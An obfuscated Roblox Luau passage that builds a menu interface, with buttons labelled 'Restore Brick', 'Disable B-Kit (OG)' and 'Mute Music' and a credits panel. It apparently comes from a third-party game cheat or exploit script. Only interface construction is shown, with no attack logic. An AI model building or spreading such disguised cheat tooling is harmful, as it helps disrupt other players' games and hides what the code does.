_llza[_sc(51,97,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,97,48)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,97,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,97,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,48)][_sc(84,101,120,116)]=[[Restore Brick]];
_llza[_sc(51,97,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,48)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,97,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,97,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,97,48)]);
_llza[_sc(51,97,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,97,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,57,57)]);
_llza[_sc(51,97,50)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(51,97,50)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(51,97,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,50)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(51,97,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(51,97,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,97,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(51,97,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,97,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,51)][_sc(78,97,109,101)]=[[disablebkitog]];
_llza[_sc(51,97,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,97,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,97,51)]);
_llza[_sc(51,97,52)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(51,97,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,97,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,97,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,97,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,52)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,97,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,97,52)]);
_llza[_sc(51,97,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(51,97,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(51,97,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,97,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,97,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,52)]);
_llza[_sc(51,97,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,97,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,97,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,97,54)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(51,97,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,97,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,97,54)]);
_llza[_sc(51,97,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,97,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,97,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,97,54)]);
_llza[_sc(51,97,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,97,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,97,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,97,56)]);
_llza[_sc(51,97,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,97,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,97,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,97,52)]);
_llza[_sc(51,97,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,97,97)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,97,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,97,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,97)][_sc(84,101,120,116)]=[[Disable B-Kit (OG)]];
_llza[_sc(51,97,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,97)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,97,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,97,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,97,97)]);
_llza[_sc(51,97,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,97,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,51)]);
_llza[_sc(51,97,99)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(51,97,99)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(51,97,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,99)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(51,97,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(51,97,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,100)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,53,48)]);
_llza[_sc(51,97,100)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,97,100)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(51,97,101)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(51,97,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,101)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(51,97,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97,101)][_sc(78,97,109,101)]=[[Credits]];
_llza[_sc(51,97,101)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(51,97,101)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,101)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(51,97,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,101)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(51,97,101)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(51,97,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(51,97,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,101)]);
_llza[_sc(51,97,102)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 194);
_llza[_sc(51,97,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,97,102)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(51,97,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,97,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0.15346, 0);
_llza[_sc(51,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,48)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,97,102)]);
_llza[_sc(51,98,48)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,98,48)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(51,98,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,102)]);
_llza[_sc(51,98,49)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(51,98,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,49)][_sc(78,97,109,101)]=[[creditsettingsTab]];
_llza[_sc(51,98,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(51,98,50)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,98,49)]);
_llza[_sc(51,98,50)][_sc(78,97,109,101)]=_sc(99,114,101,100,105,116,115,101,116,116,105,110,103,115);
_llza[_sc(51,98,51)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,98,49)]);
_llza[_sc(51,98,51)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(51,98,51)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,98,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,98,49)]);
_llza[_sc(51,98,52)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,98,52)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(51,98,52)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(51,98,52)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(51,98,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,98,49)]);
_llza[_sc(51,98,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(51,98,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,53)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(51,98,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,98,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,98,53)]);
_llza[_sc(51,98,54)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(51,98,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,54)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(51,98,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(51,98,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,98,55)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,98,54)]);
_llza[_sc(51,98,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,98,49)]);
_llza[_sc(51,98,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,98,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,98,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,56)][_sc(78,97,109,101)]=[[mutemusic]];
_llza[_sc(51,98,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,98,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,98,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,98,56)]);
_llza[_sc(51,98,57)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(51,98,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,98,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,98,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,98,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,57)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,98,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,98,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,98,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,98,57)]);
_llza[_sc(51,98,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,98,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,98,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,98,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,98,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,98,57)]);
_llza[_sc(51,98,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,98,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,98,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,98,98)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,98,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,98,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,98,98)]);
_llza[_sc(51,98,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,98,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,98,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,98,98)]);
_llza[_sc(51,98,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,98,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,100)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,98,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,98,100)]);
_llza[_sc(51,98,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,98,101)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,98,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,98,56)]);
_llza[_sc(51,98,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,98,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,98,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,98,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,98,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,98,102)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(51,98,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,98,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,98,102)][_sc(84,101,120,116)]=[[Mute Music]];
_llza[_sc(51,98,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,98,102)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,98,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,98,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,99,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,98,102)]);
_llza[_sc(51,99,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,99,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,98,102)]);
_llza[_sc(51,99,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,99,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,98,56)]);
_llza[_sc(51,99,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,99,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,101)]);
_llza[_sc(51,99,51)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 194);
_llza[_sc(51,99,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,51)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(51,99,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,99,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0.15346, 0);
_llza[_sc(51,99,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,99,52)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,99,51)]);
_llza[_sc(51,99,52)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,99,52)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(51,99,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,51)]);
_llza[_sc(51,99,53)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(51,99,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,53)][_sc(78,97,109,101)]=[[creditsTab]];
_llza[_sc(51,99,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(51,99,54)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,99,53)]);
_llza[_sc(51,99,54)][_sc(78,97,109,101)]=_sc(115,99,114,105,112,116);
_llza[_sc(51,99,55)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,99,53)]);
_llza[_sc(51,99,55)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(51,99,55)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,99,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,99,56)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,99,56)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(51,99,56)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(51,99,56)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(51,99,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,99,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(51,99,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,57)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(51,99,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,99,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,99,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,57)]);
_llza[_sc(51,99,97)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(51,99,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,97)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(51,99,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(51,99,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,99,98)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,99,97)]);
_llza[_sc(51,99,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,99,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(51,99,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(51,99,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,99)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(51,99,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,99,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,99,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
